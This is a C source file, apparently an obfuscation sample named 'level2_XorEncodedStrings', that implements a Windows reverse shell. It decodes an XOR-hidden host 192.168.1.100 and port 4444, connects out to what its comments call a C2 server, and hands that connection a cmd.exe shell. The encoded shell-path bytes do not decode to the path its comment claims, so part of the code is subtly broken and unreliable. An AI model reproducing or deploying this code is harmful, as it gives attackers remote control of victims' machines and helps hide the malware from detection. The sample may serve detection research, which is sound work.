// Windows port of level2_XorEncodedStrings
// XOR-encrypted strings with WinSock2 API

#include <stdio.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <string.h>
#include <stdlib.h>

void xor_decrypt(char *str, char key) {
    while(*str) {
        *str ^= key;
        str++;
    }
}

int main() {
    WSADATA wsa;
    SOCKET sock;
    struct sockaddr_in addr;
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;

    // XOR encrypted with key 0x22
    char host[] = {0x13, 0x1b, 0x10, 0x0c, 0x13, 0x14, 0x1a, 0x0c, 0x13, 0x0c, 0x13, 0x12, 0x12, 0x00};  // "192.168.1.100"
    char port[] = {0x16, 0x16, 0x16, 0x16, 0x00};  // "4444"
    char shell[] = {0x43, 0x1a, 0x1d, 0x6f, 0x79, 0x6c, 0x68, 0x67, 0x69, 0x71, 0x73, 0x1d, 0x61, 0x79, 0x73, 0x74, 0x67, 0x6d, 0x13, 0x10, 0x1d, 0x65, 0x6d, 0x66, 0x0c, 0x67, 0x78, 0x67, 0x00};  // "C:\\Windows\\System32\\cmd.exe"

    // Decrypt strings
    xor_decrypt(host, 0x22);
    xor_decrypt(port, 0x22);
    xor_decrypt(shell, 0x22);

    // Initialize WinSock
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        return 1;
    }

    // Create socket
    sock = WSASocket(AF_INET, SOCK_STREAM, 0, NULL, 0, 0);
    if (sock == INVALID_SOCKET) {
        WSACleanup();
        return 1;
    }

    // Configure server address
    addr.sin_family = AF_INET;
    addr.sin_port = htons(atoi(port));
    inet_pton(AF_INET, host, &addr.sin_addr);

    // Connect to C2 server
    if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) == SOCKET_ERROR) {
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    // Setup process startup info to redirect I/O
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = (HANDLE)sock;
    si.hStdOutput = (HANDLE)sock;
    si.hStdError = (HANDLE)sock;

    ZeroMemory(&pi, sizeof(pi));

    // Spawn cmd.exe shell with I/O redirected to socket
    if (!CreateProcessA(
        shell,
        NULL,
        NULL,
        NULL,
        TRUE,  // Inherit handles
        0,
        NULL,
        NULL,
        &si,
        &pi)) {
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    // Wait for shell to exit
    WaitForSingleObject(pi.hProcess, INFINITE);

    // Cleanup
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    closesocket(sock);
    WSACleanup();

    return 0;
}
